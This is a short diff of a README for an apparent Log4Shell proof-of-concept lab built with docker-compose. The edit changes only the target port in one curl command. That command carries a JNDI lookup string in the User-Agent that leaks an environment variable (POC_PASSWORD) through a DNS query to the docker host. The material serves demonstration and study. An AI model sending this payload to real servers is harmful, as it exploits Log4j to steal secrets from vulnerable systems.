@@ -65,7 +65,7 @@ docker-compose build
 1. Start the docker containers in a terminal
     1. `docker-compose up`
 1. In a second terminal, run the following. The IP is the ip address of the docker host
-    1. `curl -A "\${jndi:dns://10.10.10.31/\${env:POC_PASSWORD}}" http://10.10.10.31:8888/log4shell/`
+    1. `curl -A "\${jndi:dns://10.10.10.31/\${env:POC_PASSWORD}}" http://10.10.10.31:8080/log4shell/`
 1. The vulnerable web server will attempt to do a TXT lookup at the given IP. See log4j-dns_exfil.pcap
 
 
